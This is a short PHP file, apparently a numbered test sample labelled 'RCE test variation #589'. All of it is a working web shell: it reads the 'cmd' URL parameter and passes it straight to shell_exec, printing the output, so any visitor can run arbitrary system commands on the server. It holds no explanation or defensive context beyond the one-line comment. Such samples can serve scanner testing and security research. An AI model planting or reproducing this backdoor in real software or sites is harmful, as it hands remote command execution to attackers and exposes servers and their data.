<?php
// RCE test variation #589
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>